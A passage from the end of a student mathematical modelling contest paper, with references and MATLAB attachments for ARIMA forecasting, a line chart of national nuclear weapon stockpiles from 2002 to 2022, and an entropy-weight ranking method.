of  volcanic eruption on the environment and other fields. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>​        [1] Yang Zhehai. Model Study on the Effect of Terrain on the firing of Indirect Artillery and the  killing efficiency of nuclear Weapons [D]. PLA Information Engineering University, 2001. </p><p>​        [2] Zou Shiya, Zhang Wenzhong, Mao Yongze. Mathematical model of battlefield target damage effect of neutron bomb explosion [J]. Nuclear Electronics and Detection Technology, 2006(02): 132-136. </p><p>​        [3] LIU Tong. Research on Kill Power Evaluation Method of Air Defense Warhead [D]. Nanjing  University of Science and Technology, 2004.Team E apmcm2206077 </p><h2 id="Attachment"><a href="#Attachment" class="headerlink" title="Attachment"></a>Attachment</h2><h3 id="Attachment-1"><a href="#Attachment-1" class="headerlink" title="Attachment 1"></a>Attachment 1</h3><h4 id="Question-2-raw-data（Comparison-table-of-years-and-nuclearweapons-reservesin-the-world）"><a href="#Question-2-raw-data（Comparison-table-of-years-and-nuclearweapons-reservesin-the-world）" class="headerlink" title="Question 2 raw data（Comparison table of years and nuclearweapons reservesin the world）"></a>Question 2 raw data（Comparison table of years and nuclearweapons reservesin the world）</h4><h3 id="Attachment-2"><a href="#Attachment-2" class="headerlink" title="Attachment 2"></a>Attachment 2</h3><h4 id="code-1-Time-prediction-model"><a href="#code-1-Time-prediction-model" class="headerlink" title="code 1: Time prediction model"></a>code 1: Time prediction model</h4><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">131</span><span class="token punctuation">)</span> <span class="token function">plot</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token string">'b-'</span><span class="token punctuation">,</span><span class="token string">'LineWidth'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token function">xlabel</span><span class="token punctuation">(</span><span class="token string">'time'</span><span class="token punctuation">)</span> <span class="token function">ylabel</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span>  <span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'fontsize'</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span>  <span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">132</span><span class="token punctuation">)</span> data1 <span class="token operator">=</span> <span class="token function">diff</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">plot</span><span class="token punctuation">(</span>data1<span class="token punctuation">,</span><span class="token string">'b-'</span><span class="token punctuation">,</span><span class="token string">'LineWidth'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token function">xlabel</span><span class="token punctuation">(</span><span class="token string">'time'</span><span class="token punctuation">)</span> <span class="token function">ylabel</span><span class="token punctuation">(</span><span class="token string">'First-order differential of data'</span><span class="token punctuation">)</span>  <span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'fontsize'</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">133</span><span class="token punctuation">)</span> data2 <span class="token operator">=</span> <span class="token function">diff</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">plot</span><span class="token punctuation">(</span>data2<span class="token punctuation">,</span><span class="token string">'b-'</span><span class="token punctuation">,</span><span class="token string">'LineWidth'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token function">xlabel</span><span class="token punctuation">(</span><span class="token string">'time'</span><span class="token punctuation">)</span><span class="token comment">%Set the label  </span><span class="token function">ylabel</span><span class="token punctuation">(</span><span class="token string">'Second-order difference of data'</span><span class="token punctuation">)</span>  <span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'fontsize'</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token function">adftest</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token comment">%Test the data  </span><span class="token function">kpsstest</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> data1 <span class="token operator">=</span> <span class="token function">diff</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  d1_adf <span class="token operator">=</span> <span class="token function">adftest</span><span class="token punctuation">(</span>data1<span class="token punctuation">)</span> d1_kpss <span class="token operator">=</span> <span class="token function">kpsstest</span><span class="token punctuation">(</span>data1<span class="token punctuation">)</span>  figure <span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">211</span><span class="token punctuation">)</span>  <span class="token function">autocorr</span><span class="token punctuation">(</span>ddata<span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span>  <span class="token function">ylabel</span><span class="token punctuation">(</span><span class="token string">'ACF'</span><span class="token punctuation">)</span> <span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'fontsize'</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span>  <span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">212</span><span class="token punctuation">)</span> <span class="token function">parcorr</span><span class="token punctuation">(</span>ddata<span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span>  <span class="token function">ylabel</span><span class="token punctuation">(</span><span class="token string">'PACF'</span><span class="token punctuation">)</span>  <span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'fontsize'</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span>  pm <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> qm <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> d <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">%[p q ]=findPQ(data,pm,qm,d);%Find the functions of p and q  </span>p <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>q <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token comment">% Model start construction </span>Mdl <span class="token operator">=</span> <span class="token function">arima</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">;</span> EstMdl <span class="token operator">=</span> <span class="token function">estimate</span><span class="token punctuation">(</span>Mdl<span class="token punctuation">,</span>data<span class="token operator">'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  step <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token punctuation">[</span>forData<span class="token punctuation">,</span>YMSE<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">forecast</span><span class="token punctuation">(</span>EstMdl<span class="token punctuation">,</span>step<span class="token punctuation">,</span><span class="token string">'Y0'</span><span class="token punctuation">,</span>data<span class="token operator">'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  l <span class="token operator">=</span> forData <span class="token operator">-</span> <span class="token number">1.96</span><span class="token operator">*</span><span class="token function">sqrt</span><span class="token punctuation">(</span>YMSE<span class="token punctuation">)</span><span class="token punctuation">;</span>Team E apmcm2206077 Page <span class="token number">23</span> of <span class="token number">24</span> u <span class="token operator">=</span> forData <span class="token operator">+</span> <span class="token number">1.96</span><span class="token operator">*</span><span class="token function">sqrt</span><span class="token punctuation">(</span>YMSE<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">%Here is the confidence interval of 95  </span>figure <span class="token function">plot</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>  hold on <span class="token function">plot</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">+</span>step<span class="token punctuation">,</span>forData<span class="token punctuation">)</span>  hold on <span class="token function">plot</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">+</span>step<span class="token punctuation">,</span>l<span class="token punctuation">)</span>  <span class="token function">plot</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">+</span>step<span class="token punctuation">,</span>u<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="code-2-Line-chart-of-changesin-the-magnitude-of-nuclear-weaponsstockpiles"><a href="#code-2-Line-chart-of-changesin-the-magnitude-of-nuclear-weaponsstockpiles" class="headerlink" title="code 2: Line chart of changesin the magnitude of nuclear weaponsstockpiles"></a>code 2: Line chart of changesin the magnitude of nuclear weaponsstockpiles</h4><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">x<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">21</span><span class="token punctuation">;</span><span class="token comment">%xData on the axis, the first value represents the start of the data, the second value represents the interval, and the third value represents the termination  </span>a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">240</span><span class="token punctuation">,</span><span class="token number">240</span><span class="token punctuation">,</span><span class="token number">240</span><span class="token punctuation">,</span><span class="token number">240</span><span class="token punctuation">,</span><span class="token number">250</span><span class="token punctuation">,</span><span class="token number">250</span><span class="token punctuation">,</span><span class="token number">260</span><span class="token punctuation">,</span><span class="token number">260</span><span class="token punctuation">,</span><span class="token number">270</span><span class="token punctuation">,</span><span class="token number">280</span><span class="token punctuation">,</span><span class="token number">290</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">%a data y value  CHN </span>b<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">290</span><span class="token punctuation">,</span><span class="token number">290</span><span class="token punctuation">,</span><span class="token number">290</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">%b data y value  FRA </span>c<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">140</span><span class="token punctuation">,</span><span class="token number">140</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%IND  </span>d<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">76</span><span class="token punctuation">,</span><span class="token number">78</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%ISR </span>e<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%PRK  </span>f<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">140</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token number">165</span><span class="token punctuation">,</span><span class="token number">165</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%PAK  </span>g<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">10114</span><span class="token punctuation">,</span><span class="token number">9076</span><span class="token punctuation">,</span><span class="token number">8038</span><span class="token punctuation">,</span><span class="token number">7000</span><span class="token punctuation">,</span><span class="token number">6643</span><span class="token punctuation">,</span><span class="token number">6286</span><span class="token punctuation">,</span><span class="token number">5929</span><span class="token punctuation">,</span><span class="token number">5527</span><span class="token punctuation">,</span><span class="token number">5215</span><span class="token punctuation">,</span><span class="token number">4858</span><span class="token punctuation">,</span><span class="token number">4750</span><span class="token punctuation">,</span><span class="token number">4650</span><span class="token punctuation">,</span><span class="token number">4600</span><span class="token punctuation">,</span><span class="token number">4500</span><span class="token punctuation">,</span><span class="token number">4490</span><span class="token punctuation">,</span><span class="token number">4300</span><span class="token punctuation">,</span><span class="token number">4350</span><span class="token punctuation">,</span><span class="token number">4330</span><span class="token punctuation">,</span><span class="token number">4310</span><span class="token punctuation">,</span><span class="token number">4495</span><span class="token punctuation">,</span><span class="token number">4477</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%RUS </span>h<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%ZAF  </span><span class="token number">i</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">280</span><span class="token punctuation">,</span><span class="token number">280</span><span class="token punctuation">,</span><span class="token number">280</span><span class="token punctuation">,</span><span class="token number">280</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">220</span><span class="token punctuation">,</span><span class="token number">215</span><span class="token punctuation">,</span><span class="token number">215</span><span class="token punctuation">,</span><span class="token number">215</span><span class="token punctuation">,</span><span class="token number">210</span><span class="token punctuation">,</span><span class="token number">205</span><span class="token punctuation">,</span><span class="token number">195</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%GBR  </span><span class="token number">j</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">10457</span><span class="token punctuation">,</span><span class="token number">10027</span><span class="token punctuation">,</span><span class="token number">8570</span><span class="token punctuation">,</span><span class="token number">8360</span><span class="token punctuation">,</span><span class="token number">7853</span><span class="token punctuation">,</span><span class="token number">5709</span><span class="token punctuation">,</span><span class="token number">5273</span><span class="token punctuation">,</span><span class="token number">5113</span><span class="token punctuation">,</span><span class="token number">5066</span><span class="token punctuation">,</span><span class="token number">4897</span><span class="token punctuation">,</span><span class="token number">4881</span><span class="token punctuation">,</span><span class="token number">4804</span><span class="token punctuation">,</span><span class="token number">4717</span><span class="token punctuation">,</span><span class="token number">4571</span><span class="token punctuation">,</span><span class="token number">4018</span><span class="token punctuation">,</span><span class="token number">3822</span><span class="token punctuation">,</span><span class="token number">3785</span><span class="token punctuation">,</span><span class="token number">3805</span><span class="token punctuation">,</span><span class="token number">3750</span><span class="token punctuation">,</span><span class="token number">3708</span><span class="token punctuation">,</span><span class="token number">3708</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%USA </span><span class="token function">plot</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>a<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>b<span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>c<span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>d<span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>e<span class="token punctuation">,</span><span class="token string">'m'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>f<span class="token punctuation">,</span><span class="token string">'y'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>g<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>h<span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">%Linear, color, marker  </span><span class="token function">axis</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">700</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">%Determine the x-axis and y-axis block plot size </span><span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'XTick'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">:</span><span class="token number">22</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">%xAxis range 2002-2022, interval 5  </span><span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'YTick'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">2000</span><span class="token operator">:</span><span class="token number">12000</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">%yShaft range 0-12000 with 2000 intervals </span><span class="token function">legend</span><span class="token punctuation">(</span><span class="token string">'CHN'</span><span class="token punctuation">,</span><span class="token string">'FRA'</span><span class="token punctuation">,</span><span class="token string">'IND'</span><span class="token punctuation">,</span><span class="token string">'ISR'</span><span class="token punctuation">,</span><span class="token string">'PRK'</span><span class="token punctuation">,</span><span class="token string">'PAK'</span><span class="token punctuation">,</span><span class="token string">'RUS'</span><span class="token punctuation">,</span><span class="token string">'ZAF'</span><span class="token punctuation">,</span><span class="token string">'GBR'</span><span class="token punctuation">,</span><span class="token string">'USA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">%Callout in the upper right corner  </span><span class="token function">xlabel</span><span class="token punctuation">(</span><span class="token string">'Year'</span><span class="token punctuation">)</span> <span class="token comment">%xDescription of axis coordinates </span><span class="token function">ylabel</span><span class="token punctuation">(</span><span class="token string">'Changes in nuclear weapons stocks'</span><span class="token punctuation">)</span> <span class="token comment">%yDescription of axis coordinates  </span><span class="token function">title</span><span class="token punctuation">(</span>"Nuclear weapons change line graph"<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="code-3-Entropy-weight-law"><a href="#code-3-Entropy-weight-law" class="headerlink" title="code 3:Entropy weight law"></a>code 3:Entropy weight law</h4><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token punctuation">[</span>n1<span class="token punctuation">,</span>m1<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">size</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>m1 <span class="token function">C</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">./</span><span class="token punctuation">(</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">%CConstitute a matrix  </span><span class="token keyword">end</span> <span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n1 <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>m1 <span class="token function">P</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">./</span><span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">end</span><span class="token keyword">end</span> <span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n1 <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>m1 <span class="token keyword">if</span> <span class="token function">P</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span>  <span class="token function">P</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1E-6</span> <span class="token keyword">end</span><span class="token keyword">end</span> <span class="token keyword">end</span> <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>m1 <span class="token function">e</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token function">log</span><span class="token punctuation">(</span>n1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">P</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">.*</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">P</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">%ultiply  </span><span class="token keyword">end</span> d<span class="token operator">=</span><span class="token number">1</span><span class="token operator">-</span>e <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>m1<span class="token function">wn</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">sum</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token keyword">end</span>  s<span class="token operator">=</span>wn<span class="token operator">*</span>P<span class="token operator">'</span><span class="token punctuation">;</span>s<span class="token operator">=</span>s<span class="token operator">'</span><span class="token punctuation">;</span> <span class="token punctuation">[</span>ssort<span class="token punctuation">,</span>id<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">sort</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token string">'descend'</span><span class="token punctuation">)</span><span class="token comment">%Get the result</span><span aria-hidden="true" 